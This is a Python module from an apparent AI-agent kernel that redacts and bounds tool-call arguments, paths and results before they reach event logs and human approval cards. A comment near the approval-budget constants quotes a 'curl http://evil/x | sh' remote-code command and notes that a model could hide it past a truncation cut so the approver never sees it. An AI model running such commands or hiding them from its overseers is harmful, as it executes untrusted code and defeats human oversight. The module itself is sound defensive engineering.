from __future__ import annotations

from collections.abc import Callable, Mapping
from typing import Any

from monoid_agent_kernel.errors import WorkspaceError
from monoid_agent_kernel.permissions import PermissionPolicy
from monoid_agent_kernel.web import public_query_preview, public_url_preview

REDACTED_PATH = "[redacted-path]"


def public_path(path: str, policy: PermissionPolicy) -> str:
    """The publishable form of one path — redacted by pattern, and fail-closed on a bad one.

    Goes through ``_is_path_redacted`` rather than ``policy.is_path_redacted`` directly. The raw
    predicate normalizes before matching and *raises* on an absolute path or a ``..`` traversal,
    both of which a model can put in a ``path`` argument, and every caller of this function sits on
    an event-construction path. So the raise did not produce a failed tool observation the model
    could correct — it escaped ``_emit_tool_started`` before validation, and the error handler
    retried the same emission, ending the run of any operator who had configured
    ``redact_patterns``.

    Guarding here rather than at a call site is the point. Thirteen call sites share this function
    and its ``public_inline_path`` wrapper — nine across ``loop``, ``loop_phases``, ``tasks``,
    ``tool_services.shell`` and ``core.projections``, plus four inside this module — and a review
    found one of them. Fixing that one would have left eleven and made a
    third implementation of a rule that already existed in two places — which is how this defect
    was reachable at all: the guard was added to ``preview_value``'s path branch and not to its
    twin here.
    """
    return REDACTED_PATH if _is_path_redacted(path, policy) else path


def public_inline_path(path: str, policy: PermissionPolicy) -> str:
    """A path for a *log* field a renderer prints inline: redacted, bounded, and marked when cut.

    The distinction this draws is the one the release keeps rediscovering. ``public_path`` alone is
    for **contract** surfaces — ``proposal.json``'s ``changed_paths`` and ``snapshot_path`` are
    resolved back to real files by ``core.proposal_file``, ``core.packages`` and ``core.schemas``,
    so a truncated value there does not describe a shorter path, it breaks replay and packaging.
    This one is for surfaces nobody resolves: ``tool.call.started.paths`` and
    ``workspace.file.changed``'s ``paths`` and ``result.path``. Not ``artifact.emitted.path``,
    which looks like a member of this family and is not — ``emit_artifact_bytes`` rewrites it to
    ``artifacts/<id>/<basename>``, so it is a run-dir pointer readers resolve, and it stays raw.

    It exists because those three were three different answers. ``paths`` got the cap and the
    marker; ``artifact.emitted.path`` got neither, four lines under a comment about closing "the
    second emit the wider door"; and ``public_result_content`` diverted ``path`` to bare
    ``public_path``, so one ``workspace.file.changed`` carried the same argument cut-and-marked in
    ``paths`` and whole in ``result.path`` — the cap defeated by the field beside it, which is also
    how the ``source_path`` redaction gap worked.
    """
    return truncate_inline_text(
        public_path(path, policy),
        threshold=PREVIEW_BYTE_THRESHOLD,
        budget=PREVIEW_BYTE_BUDGET,
    )


def public_identifier(value: str) -> str:
    """An identifier for publication, bounded.

    Named for what it is rather than for the first field that needed it. An identifier field looks
    kernel-controlled and generally is not: `_aexecute_tool_call` handles a `call_name` the catalog
    cannot resolve and still emits it (36 KB, measured, across `tool.call.started` and
    `tool.call.failed`); `response_id` and `previous_turn_handle` are echoed from the gateway, i.e.
    from outside the trust boundary; and a `job_id` is whatever the model asked about.

    "That field is an identifier" is the same assumption that left dict keys, env keys and the tool
    name unbounded, three separate times in this release.
    """
    return truncate_inline_text(value, threshold=PREVIEW_BYTE_THRESHOLD, budget=PREVIEW_BYTE_BUDGET)


def public_error_message(error: str) -> str:
    if not error:
        return ""
    if "PRIVATE KEY" in error.upper():
        return "[redacted-sensitive-error]"
    return error


def public_result_content(content: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    def one(key: str, value: Any) -> Any:
        if key == "content":
            return redacted_value(value)
        if key == "path" and isinstance(value, str):
            # Same bound as `paths` on the event that carries this. Diverting `path` to bare
            # `public_path` published the model's whole argument beside its own truncation.
            return public_inline_path(value, policy)
        return preview_value(key, value, policy)

    return public_mapping(content, one)


def public_capability_result(result: Mapping[str, Any]) -> dict[str, Any]:
    """Return the public view of a capability task result.

    The private task result may carry raw grant material used by the loop to admit a lease.
    Public surfaces only get non-secret lease descriptors and denial state.
    """

    lease = result.get("lease") if isinstance(result.get("lease"), Mapping) else None
    granted = result.get("granted") is True or result.get("approved") is True
    if lease is not None and granted:
        public: dict[str, Any] = {"status": "granted"}
        for key in ("capability", "lease_id", "expires_at"):
            if key in lease:
                public[key] = lease[key]
        if isinstance(lease.get("scope"), Mapping):
            public["scope"] = dict(lease["scope"])
        if result.get("reason"):
            public["reason"] = str(result.get("reason"))
        return public

    public = {"status": "denied", "reason": str(result.get("reason") or "denied")}
    capability = result.get("capability")
    if capability is None and lease is not None:
        capability = lease.get("capability")
    if capability:
        public["capability"] = str(capability)
    return public


def public_proposal_payload(payload: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    files = [file for file in payload.get("files", []) if isinstance(file, dict)]
    return {
        "path": "proposal.json",
        "mode": payload.get("mode"),
        "proposal_hash": payload.get("proposal_hash"),
        "diff_path": payload.get("diff_path"),
        "diff_bytes": payload.get("diff_bytes"),
        "diff_sha256": payload.get("diff_sha256"),
        "changed_paths": [public_path(str(path), policy) for path in payload.get("changed_paths", [])],
        "files": [public_proposal_file(file, policy) for file in files],
    }


def public_proposal_file(file: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    path = str(file.get("path", ""))
    # The guarded predicate, for the same reason `public_path` uses it — and because after that
    # change this function was calling both: line 101 failed closed while this line still raised on
    # the identical string. Proposal paths come from the workspace diff rather than from a model
    # argument, so this is harder to reach than the tool-call sites, but "that input is always
    # well-formed" is exactly the assumption that made the other two reachable.
    redacted = _is_path_redacted(path, policy)
    return {
        "path": public_path(path, policy),
        "kind": file.get("kind"),
        "size": file.get("size"),
        "sha256": file.get("sha256"),
        "base_sha256": file.get("base_sha256"),
        "proposed_sha256": file.get("proposed_sha256"),
        "snapshot_sha256": file.get("snapshot_sha256"),
        "change_kind": file.get("change_kind"),
        "snapshot_path": REDACTED_PATH if redacted else file.get("snapshot_path"),
    }


def args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """The generic trace preview: caps and content-field redaction, and **no secret-name guessing**.

    Deliberately asymmetric with ``core.tool_approval.redact_tool_arguments``, which does mask
    secret-*named* keys. That is not an oversight to bind: ``0109e06`` removed "unconfigurable
    key-name/value guessing" from this module on purpose and made secret redaction beyond content
    fields the integrating backend's job through the ``EventSink`` seam
    (``examples/redacting_event_sink.py``, pinned by ``tests/test_observability.py``). The approval
    record is a different artifact -- a human acts on it directly -- so it masks.

    The consequence is real and worth stating rather than implying otherwise: an ``api_key`` argument
    is masked on an ``ask``-gated call and published verbatim on an ``allow`` call. Anyone who wants
    it masked on both adds the example sink, or does not pass credentials as tool arguments.
    """
    return public_mapping(arguments, lambda key, value: preview_value(key, value, policy))


# ``run.finish`` arguments that are the model's own prose rather than metadata about the run.
# ``outputs`` is a path list and stays previewed normally.
_FINISH_CONTENT_KEYS = frozenset({"summary", "notes"})


def finish_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Preview for ``run.finish``, whose ``summary`` is the run's final answer.

    Settling through ``run.finish`` is the default flow, so this argument *is* the model-authored
    final text — the same value that reaches ``turn.settled``. Left to the generic preview it was
    copied verbatim into ``tool.call.started.data.args_preview`` (and truncated to a 160-*byte*
    prefix when long), putting model output on `events.jsonl` and every event sink through a
    second door. Removing it from the settle events alone would not have closed the channel.

    Kept out of ``_is_content_field``: that predicate is documented as *file*-content fields, and
    these are model content. Same destination, different reason.

    ``summary`` and ``notes`` are treated alike here but recover differently, which is deliberate.
    ``summary`` becomes ``state.final_text``, so it is written to the run-dir settled-text record
    and hydrated back for entitled readers. ``notes`` has no such route — it is redacted at both
    public seams that carry it (here, and ``arguments_preview`` on the approval request; see
    ``core.tool_approval``) and survives only in ``transcript.jsonl``'s private ``model_turn``
    record. That is the intended destination for model prose; it is not a join-back path, and
    nothing should be built expecting one.

    ``None`` is left alone rather than redacted: ``notes`` is declared ``["string", "null"]``, and
    a redaction marker on an absent value tells an operator something was withheld when nothing
    was there.
    """
    return public_mapping(
        arguments,
        lambda key, value: (
            redacted_value(value)
            if value is not None and key.lower() in _FINISH_CONTENT_KEYS
            else preview_value(key, value, policy)
        ),
    )


def shell_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    env = arguments.get("env") if isinstance(arguments.get("env"), dict) else {}
    return {
        "command_preview": preview_value("command_preview", str(arguments.get("command") or ""), policy),
        "cwd": preview_value("cwd", arguments.get("cwd", "."), policy),
        # Previewed, not copied, even though all three are declared `["integer", "null"]`. The
        # schema does not protect this surface: `tool.call.started` is emitted *before*
        # `validate_args` rejects the call, so a model that sends a 2 KB string in `timeout_s`
        # publishes it and is then told the call was invalid. "It is an int" is the same assumption
        # that left `env_keys` and the tool name unbounded.
        "timeout_s": preview_value("timeout_s", arguments.get("timeout_s"), policy),
        "max_output_bytes": preview_value("max_output_bytes", arguments.get("max_output_bytes"), policy),
        "startup_wait_s": preview_value("startup_wait_s", arguments.get("startup_wait_s"), policy),
        "background": bool(arguments.get("background", False)),
        "resume_on_exit": bool(arguments.get("resume_on_exit", True)),
        # Previewed, not copied. Env *keys* are model-controlled strings of unbounded length and
        # count: a 20 KB key rode out verbatim here while the same value in a generic argument was
        # capped. This branch withholds env *values* on purpose, so letting the keys carry arbitrary
        # text made it a way to publish exactly what it was withholding.
        "env_keys": preview_value("env_keys", sorted(str(key) for key in env), policy),
    }


def web_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Preview for the web tools, which withhold the query and URL and publish only descriptors.

    Every descriptor below is previewed rather than copied. They are model-controlled strings, and
    copying them raw made this branch a way to publish the very text it exists to withhold: a
    ``locale`` or a ``blocked_domains`` entry carrying 20 KB rode out verbatim in the same event
    whose ``query_preview`` was reduced to a digest. Bypassing the cap is not free just because the
    field sounds like an enum.
    """
    preview: dict[str, Any] = {}
    if "query" in arguments:
        preview["query_preview"] = public_query_preview(str(arguments.get("query") or ""))
    if "url" in arguments:
        preview["url_preview"] = public_url_preview(str(arguments.get("url") or ""))
    for key in (
        "max_results",
        "max_tokens",
        "max_urls",
        "max_snippets",
        "timeout_s",
        "max_bytes",
        "recency_days",
        "locale",
        "format",
    ):
        if key in arguments:
            preview[key] = preview_value(key, arguments[key], policy)
    if "allowed_domains" in arguments:
        preview["allowed_domains"] = preview_value(
            "allowed_domains", arguments.get("allowed_domains") or [], policy
        )
    if "blocked_domains" in arguments:
        preview["blocked_domains"] = preview_value(
            "blocked_domains", arguments.get("blocked_domains") or [], policy
        )
    return preview


# A preview is capped so that a bounded amount of text reaches the event stream, and "bounded" is a
# byte budget — that is what an event log costs and what an operator's redaction promise is about.
# Slicing by *characters* against a *byte* threshold made the cap depend on the language: 100 Hangul
# characters are 300 bytes, so they cleared the 240-byte threshold and were then "truncated" to a
# 160-character prefix, i.e. to all 100 of them. Every multibyte string with at most 160 characters
# and more than 240 bytes was published in full while the payload reported ``truncated: True``.
PREVIEW_BYTE_THRESHOLD = 240
PREVIEW_BYTE_BUDGET = 160
# Bounds on the recursion itself. Nested containers arrive from model-controlled input --
# ``artifact.emit.metadata`` and ``run.update_plan.items`` both declare ``additionalProperties:
# True`` -- so without these a model can hand the writer a structure that costs more to preview than
# the run is worth, or one deep enough to raise ``RecursionError`` inside tool dispatch. The read
# side already learned the depth lesson (``core.schemas`` catches ``RecursionError``); this is the
# write side learning it.
PREVIEW_MAX_DEPTH = 8
PREVIEW_MAX_KEYS = 20
PREVIEW_MAX_ITEMS = 20

# The *decision* surface's budget. An approval preview is read by a person deciding whether to let a
# call run, not by a log reader, and the two want opposite things from a cap. Measured on the trace
# budget: a 341-byte `shell.exec` command was cut at 160 bytes, so `&& curl http://evil/x | sh`
# reached no surface the approver could see -- with the model choosing where in the string to put it.
# That is a strictly worse trade than the egress it buys, because a whole *file body* (the leak this
# release exists to close) is redacted outright by `_is_content_field` regardless of this number.
# So: big enough for any realistic command or argument, still bounded against a pathological one.
APPROVAL_BYTE_THRESHOLD = 4096
APPROVAL_BYTE_BUDGET = 4096

# Keys whose value a renderer prints inline, so the preview has to stay a *string*. Replacing one
# with a `{"preview": ...}` dict renders `[object Object]` -- `WorkspaceInspector.svelte` does
# `{item.step}`, and `svelte-check` cannot catch it because `run-state.ts` casts through `unknown`.
_INLINE_TEXT_KEYS = frozenset({"step"})

# Truncation marker for those keys. A bare prefix would misreport a cut value as the whole value.
TRUNCATION_SUFFIX = "…"


def truncate_to_bytes(value: str, max_bytes: int) -> str:
    """The longest prefix of ``value`` whose UTF-8 encoding fits in ``max_bytes``.

    Backs off to a codepoint boundary. A bare ``value.encode()[:n].decode()`` raises
    ``UnicodeDecodeError`` whenever the cut lands inside a multi-byte sequence, which for non-ASCII
    text is the common case rather than the edge case. ``errors="ignore"`` drops exactly the
    trailing partial sequence and nothing else: the bytes came from encoding a valid ``str``, so the
    only ill-formed run possible is the one the slice created, and UTF-8 is self-synchronizing.

    Shared with ``shell.preview_command`` rather than reimplemented there. The two truncators had
    already drifted to different constants (240/160 here, 240/200 there) while carrying the same
    defect, so a fix applied to one would have left the other publishing whole commands.
    """
    if max_bytes <= 0:
        return ""
    encoded = value.encode("utf-8")
    if len(encoded) <= max_bytes:
        return value
    return encoded[:max_bytes].decode("utf-8", errors="ignore")


def truncate_inline_text(value: str, *, threshold: int, budget: int) -> str:
    """Bound a string that has to *stay* a string, marking it when it was cut.

    The two callers publish values a renderer prints directly — a plan `step`, and the `paths` entry
    `narration._target` falls back to when `args_preview.path` came through as a preview dict — so
    neither can carry the `{"truncated": True}` envelope that says "there was more". The marker has
    to be in the text or it does not exist.

    This is one function because it was two. `paths` truncated at the budget with no threshold and
    appended nothing, so a 5000-byte path and a different 5000-byte path sharing a prefix published
    the *same* 160 bytes and each read as an exact, complete filename. The plan branch, three lines
    away, had the threshold and the marker. Two sites implementing "truncate but stay a string" with
    different answers is the shape that produced most of this release's defects, so they now cannot
    disagree.

    The result is at most ``budget`` bytes plus the marker, matching the bound already published for
    plan steps; the marker is deliberately outside the budget rather than eating into it, so the
    readable prefix is the same length whether or not anything was cut.
    """
    if len(value.encode("utf-8")) <= threshold:
        return value
    return truncate_to_bytes(value, budget) + TRUNCATION_SUFFIX


def _bounded_key(
    raw: str, *, threshold: int, budget: int, taken: Mapping[str, Any], _collisions: dict[str, int]
) -> str:
    """The published form of one mapping key: bounded, marked, and never silently merged.

    One function because it was two, and the second one did not exist. Bounding keys inside
    ``preview_value``'s dict branch fixed every key at depth >= 1 and left depth 0 — which is the
    *only* depth a model names directly, since the outer mapping of a tool call is built by
    ``args_preview`` and its four siblings rather than by the traversal. A 90 KB body arrived
    ``{"redacted": true}`` as a value, 162 bytes as a nested key, and verbatim as a top-level key.

    Collisions are disambiguated rather than dropped: truncation makes distinct keys equal, and a
    mapping resolves that by discarding one of them without a word — a cap that does not say it
    capped, which is the failure this release exists to close.
    """
    name = truncate_inline_text(raw, threshold=threshold, budget=budget)
    if name not in taken:
        return name
    # Probe upward from the count already recorded rather than from 2. The linear rescan was
    # quadratic at the one caller with no key-count cap -- 8000 colliding argument names took 15 s
    # inside event construction, which is a denial of service wearing a correctness fix's clothes.
    suffix = _collisions.get(name, 1) + 1
    while f"{name}#{suffix}" in taken:
        suffix += 1
    _collisions[name] = suffix
    return f"{name}#{suffix}"


def public_mapping(
    values: Mapping[str, Any],
    preview: Callable[[str, Any], Any],
    *,
    threshold: int = PREVIEW_BYTE_THRESHOLD,
    budget: int = PREVIEW_BYTE_BUDGET,
) -> dict[str, Any]:
    """Build a public mapping from ``values``, bounding the **key** as well as the value.

    Every builder whose outer mapping has *model-authored* keys goes through here, so "the key is
    model-authored text too" is stated once. ``shell_args_preview`` and ``web_args_preview`` do not:
    their outer keys are kernel literals (``command_preview``, ``env_keys``, ``url_preview``), and
    only the values they wrap come from the model. ``preview`` receives the *whole* key, not the bounded one: a 5 KB key
    ending in ``_path`` is still a path, and judging it by its truncated form would let length
    defeat the redaction.

    Deliberately not ``preview_value(key, mapping, policy)``, which would also apply
    ``PREVIEW_MAX_KEYS``. The top-level *count* cap is absent on purpose — ``narration`` and the
    activity feed read specific argument names, and dropping the 21st argument would blank them —
    and that reasoning is about count, not length.
    """
    published: dict[str, Any] = {}
    collisions: dict[str, int] = {}
    for key, value in values.items():
        name = _bounded_key(
            str(key), threshold=threshold, budget=budget, taken=published, _collisions=collisions
        )
        published[name] = preview(str(key), value)
    return published


class _Unmasked:
    """Sentinel: the mask looked at this value and declined to replace it."""

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return "UNMASKED"


UNMASKED = _Unmasked()


def preview_value(
    key: str,
    value: Any,
    policy: PermissionPolicy,
    *,
    mask: Callable[[str, Any], Any] | None = None,
    threshold: int = PREVIEW_BYTE_THRESHOLD,
    budget: int = PREVIEW_BYTE_BUDGET,
    decision_surface: bool = False,
    list_marker: bool = True,
    _depth: int = 0,
    _ancestors: frozenset[int] = frozenset(),
) -> Any:
    """Bound a value for publication, optionally masking keys the caller names first.

    ``mask`` is consulted at *every* level with that level's key, and returning anything other than
    ``UNMASKED`` replaces the value outright. It exists so that the approval projection can add its
    secret- and prose-key rules to this traversal instead of running a second one:
    ``core.tool_approval.redact_tool_arguments`` had its own recursion carrying the masking rules but
    no caps, while this one had the caps but knew nothing about secrets. Which half of the policy
    applied to a value depended only on which surface it left through. One traversal, all the rules.

    ``decision_surface=True`` marks a surface a *person* reads to authorize a call, and stops this
    function withholding from them: file bodies and ``redact_patterns`` paths are shown, bounded by
    the caller's budget rather than blanked. Every other surface is a log, and the default withholds
    both. It is deliberately one switch — see ``core.tool_approval.redact_tool_arguments``.

    ``list_marker=False`` caps the list **passed in** without appending the
    ``{"truncated_items": n}`` element. Only the *caller* knows whether it is previewing a JSON blob
    (where a self-describing marker is the signal, and the default) or a **typed array** a consumer
    iterates by element shape (where the marker is a foreign object). Callers that pass ``False``
    are expected to report the drop out-of-band; ``len(original) - len(previewed)`` gives the count
    without restating the cap.

    It deliberately does **not** propagate into nested containers, which is where a first attempt
    got it wrong. Only the top-level array has the typed consumer; a list nested inside one of its
    elements is an ordinary JSON blob, and suppressing *its* marker dropped elements that the
    caller's ``len(original) - len(previewed)`` cannot see, because that only measures the root.
    The result was a silent cap -- the failure this release exists to stop -- reached by binding a
    rule to every depth on the reasoning that a rule bound at one site should be bound at its twins.
    Nested lists are not that twin.
    """
    if mask is not None:
        replacement = mask(key, value)
        if replacement is not UNMASKED:
            return replacement
    lowered = key.lower()
    if not decision_surface:
        # One branch, both withholdings. They were two independent flags for one commit, and that
        # was long enough to ship the inversion: the approval card turned content redaction *off*
        # so an approver could read the body, and left path redaction *on*, so it showed a private
        # key's contents while hiding which file it was being written to. Whatever an operator
        # means by ``redact_patterns``, it is not that. A surface either withholds from its reader
        # or it does not; a caller cannot pick one half any more.
        if _is_content_field(lowered):
            return redacted_value(value)
        if (
            _is_path_field(lowered)
            and isinstance(value, str)
            and _is_path_redacted(value, policy)
        ):
            return redacted_value(value)
    if isinstance(value, (dict, list)) and _depth >= PREVIEW_MAX_DEPTH:
        return {"truncated": True, "type": type(value).__name__, "depth_exceeded": PREVIEW_MAX_DEPTH}
    if isinstance(value, (dict, list)):
        # The depth cap terminates but does not bound *cost*: a container reachable from itself is
        # re-expanded once per edge per level, so a 21-object input with 20 self-referencing keys
        # costs 20**8 nodes. Measured at fanout 7: 23 s and 377 MB of serialized JSON, from an input that fits on a
        # line. Not reachable from a `json.loads`-derived tool argument (JSON cannot express
        # sharing), but `public_result_content` previews a `ToolResult.content` built by a custom or
        # MCP tool handler in ordinary Python objects, which can.
        #
        # Ancestors on the current path, not everything seen: the same small dict appearing twice in
        # a payload is ordinary and both copies should render. Only a container containing *itself*
        # is elided, which is the case that has no faithful rendering anyway.
        if id(value) in _ancestors:
            return {"truncated": True, "type": type(value).__name__, "circular": True}
        _ancestors = _ancestors | {id(value)}
    if isinstance(value, dict):
        preview: dict[str, Any] = {}
        collisions: dict[str, int] = {}
        for child_key, child_value in list(value.items())[:PREVIEW_MAX_KEYS]:
            # The key is model-authored text too, and it was the one string this function published
            # at any length: the same 30 KB file body arrived ``{"redacted": true}`` in the value
            # position and verbatim in the key position, past both the byte cap and
            # ``_is_content_field`` (which reads the key to judge the *value*, so a body moved into
            # the key has no name left to incriminate it). ``env_keys`` was routed through here for
            # exactly this reason one commit earlier -- but that bound keys arriving as list
            # *items*, and left the twin where they arrive as keys.
            name = _bounded_key(
                str(child_key), threshold=threshold, budget=budget, taken=preview, _collisions=collisions
            )
            # Rules still match on the *whole* key: a 5 KB key ending in ``_path`` is a path, and
            # judging it by its truncated form would let length defeat the redaction.
            preview[name] = preview_value(
                str(child_key),
                child_value,
                policy,
                mask=mask,
                threshold=threshold,
                budget=budget,
                decision_surface=decision_surface,
                _depth=_depth + 1,
                _ancestors=_ancestors,
            )
        # A source key literally named ``truncated_keys`` loses to the marker. Acceptable: the
        # preview is lossy by construction, and no consumer reads nested preview dicts by key --
        # ``narration`` and the Studio activity feed both read only top-level ``args_preview`` keys,
        # which the ``*_args_preview`` builders above assemble themselves and never width-cap.
        if len(value) > PREVIEW_MAX_KEYS:
            preview["truncated_keys"] = len(value) - PREVIEW_MAX_KEYS
        return preview
    if isinstance(value, list):
        # The parent key is reused for each item because list items have no key of their own. A
        # secret-named list is already masked whole before reaching here; what this carries is the
        # mask *down* to dicts inside the list, so ``{"headers": [{"api_key": ...}]}`` still masks.
        items = [
            preview_value(
                key,
                item,
                policy,
                mask=mask,
                threshold=threshold,
                budget=budget,
                decision_surface=decision_surface,
                _depth=_depth + 1,
                _ancestors=_ancestors,
            )
            for item in value[:PREVIEW_MAX_ITEMS]
        ]
        # The marker is a *foreign shape* in the array it is appended to. In a JSON blob that is the
        # point -- it is self-describing and the reader sees it. In a typed array it is a defect: the
        # Studio plan renderer reads ``items[].step``, so this element drew a blank row AND inflated
        # the ``n/len(plan)`` progress denominator. ``list_marker`` applies to the list passed in
        # and does *not* propagate -- see the docstring for why nested lists are not that twin.
        # (This comment used to claim the opposite, and outlived the fix that made it false.)
        if list_marker and len(value) > PREVIEW_MAX_ITEMS:
            items.append({"truncated_items": len(value) - PREVIEW_MAX_ITEMS})
        return items
    if isinstance(value, str):
        encoded_len = len(value.encode("utf-8"))
        if encoded_len > threshold:
            if lowered in _INLINE_TEXT_KEYS:
                # Stays a string: a renderer prints this one directly.
                return truncate_inline_text(value, threshold=threshold, budget=budget)
            return {
                "type": "str",
                "preview": truncate_to_bytes(value, budget),
                "bytes": encoded_len,
                "truncated": True,
            }
        return value
    return value


def _is_path_redacted(value: str, policy: PermissionPolicy) -> bool:
    """``policy.is_path_redacted``, but a path that cannot be normalized counts as redacted.

    ``is_path_redacted`` normalizes before matching, and normalization *raises* on an absolute path
    or a ``..`` traversal — both of which a model can put in a ``path`` argument. Left to propagate,
    that ends the run from inside event construction: the preview builders sit on the emit path, and
    ``WorkspaceError`` escaping there kills a run for an operator whose only mistake was configuring
    ``redact_patterns``. Fail closed rather than open: an argument that does not name a workspace
    path is precisely the kind that should not be published verbatim.
    """
    try:
        return policy.is_path_redacted(value)
    except WorkspaceError:
        # Fail closed, for every path-naming field. Scoping this to ``path``/``root``/``cwd`` --
        # to stop a task result's absolute ``report_path`` being blanked by an unrelated pattern --
        # re-opened the leak it was meant to leave closed: ``normalize_workspace_path`` raises on any
        # ``..`` component *before* resolving it, so ``x/../secrets/creds.txt`` raises while naming a
        # path the operator's pattern matches, and was then published verbatim next to
        # ``paths: ["[redacted-path]"]`` on the same event. Both failure modes are real; only one is
        # silent. An over-redacted field says ``{"redacted": true}`` and an operator can see it and
        # widen the glob, while an under-redacted one looks exactly like a field that was checked.
        return True


def redacted_value(value: Any) -> dict[str, Any]:
    if isinstance(value, str):
        return {"redacted": True, "type": "str", "bytes": len(value.encode("utf-8"))}
    if isinstance(value, bytes):
        return {"redacted": True, "type": "bytes", "bytes": len(value)}
    return {"redacted": True, "type": type(value).__name__}


def public_event_payload(data: Mapping[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Bound every value in an event payload a service assembled by hand.

    The ``*_args_preview`` builders bound what reaches ``tool.call.started``, and services then
    built their *own* payloads for the events they emit either side of it — ``to_public_json`` at
    seven emit sites covering six shell event types, an inline ``event_data`` in each of the three
    web builders. Same model-authored
    values, same run, one of them capped: a 20 KB ``env`` key or ``blocked_domains`` entry was
    published verbatim on ``tool.approval.requested`` while ``args_preview`` reduced it to a
    preview, and a ``cwd`` under ``redact_patterns`` came out ``{"redacted": true}`` on one event
    and as the path on the next.

    These payloads are declared ``additionalProperties: true`` JSON blobs with no typed renderer,
    so the self-describing ``{"truncated_items": n}`` marker is the right default here — the
    argument that kept it out of ``plan.updated.items`` was about a consumer reading
    ``items[].step``, and nothing reads these by element shape.
    """
    return public_mapping(data, lambda key, value: preview_value(key, value, policy))


def touches_redacted_path(values: Mapping[str, Any], policy: PermissionPolicy) -> bool:
    """True if any argument in ``values`` is a path the operator's ``redact_patterns`` matches.

    Exists so the decision surface can drop its exemption *as a whole*. ``preview_value`` sees one
    key at a time and cannot know that the ``content`` it is about to show belongs to a call whose
    ``path`` the operator marked secret; this sees the whole argument map, which is the only level
    where that question can be answered.

    **Recurses, because ``preview_value`` does.** Checking only ``values.items()`` made this the
    shallower half of a pair that has to agree: a redacted path one level down — inside
    ``artifact.emit``'s ``metadata``, which is declared ``additionalProperties: true`` and so
    survives argument validation — neither triggered the escape hatch nor got redacted by the
    traversal, because ``decision_surface`` had switched that off. It was published verbatim where
    the release before this one had rendered ``{"redacted": true}``: a fix that made one field more
    exposed than it found it. Lists are walked for the same reason; a ``str``-only check missed
    ``{"source_path": ["secrets/creds.txt"]}``.
    """

    seen: set[tuple[int, str]] = set()

    def walk(value: Any, key: str, depth: int) -> bool:
        # The same ancestor guard `preview_value` uses. Without it this re-expanded a
        # self-referencing container, and it runs *before* `preview_value` -- so the guard three
        # functions away never got a chance to fire. A set rather than a frozenset chain because
        # this only answers yes/no: nothing is rendered, so eliding a legitimately shared value
        # costs nothing here, unlike in the preview.
        if isinstance(value, (Mapping, list)):
            # Keyed on (identity, inherited key), not identity alone. A *list* takes its key from
            # the parent, so the same list reached under `other` and under `source_path` answers
            # differently -- an identity-only set would let the first, negative visit suppress the
            # second. Not reachable from JSON-derived arguments, which cannot share, but the guard
            # should not be the thing that introduces a miss.
            if (id(value), key) in seen:
                return False
            seen.add((id(value), key))
        # ``depth`` counts the same way ``preview_value``'s ``_depth`` does: the outer mapping is
        # not a level, so a top-level value is 0. Counting the mapping itself made this stop one
        # level *earlier* than the traversal it has to agree with, and `preview_value`'s depth cap
        # only blocks containers -- so a string at the boundary was still previewed and published
        # while this had already given up on it. A matched path and a file body both rode out.
        if depth > PREVIEW_MAX_DEPTH:
            return False
        if isinstance(value, Mapping):
            return any(walk(item, str(child), depth + 1) for child, item in value.items())
        if isinstance(value, list):
            # The parent key carries down: list items have no key of their own, which is the same
            # reason ``preview_value`` reuses it.
            return any(walk(item, key, depth + 1) for item in value)
        lowered = key.lower()
        return (
            _is_path_field(lowered)
            and isinstance(value, str)
            and _is_path_redacted(value, policy)
        )

    return any(walk(value, str(key), 0) for key, value in values.items())


def _is_path_field(lowered_key: str) -> bool:
    # Which arguments carry a workspace path is declared per tool by ``ToolSpec.path_args``, not by
    # this module -- and ``fs.move``/``fs.copy`` declare ``("source_path", "destination_path")``.
    # Matching a hardcoded ``{"path", "root", "cwd"}`` meant one ``fs.move`` published
    # ``paths: ["[redacted-path]"]`` next to ``args_preview.source_path: "secrets/creds.txt"`` on
    # the *same event*: the operator's redaction defeated by the field beside it.
    #
    # Matched by name rather than by consulting the registry because this function also previews
    # values that never were a tool argument (result payloads, artifact metadata, capability
    # descriptors), where there is no ``ToolSpec`` to ask -- and because a custom or MCP tool that
    # names an argument ``*_path`` is then covered without registering anything here.
    return lowered_key in {"path", "root", "cwd"} or lowered_key.endswith("_path")



def _is_content_field(lowered_key: str) -> bool:
    # File-content fields are kept out of the public event stream; full content
    # lives only in the private transcript/proposal artifacts. Secret redaction
    # beyond this (and PermissionPolicy.redact_patterns) is the integrator's job.
    return lowered_key in {"content", "old", "new", "old_text", "new_text"}
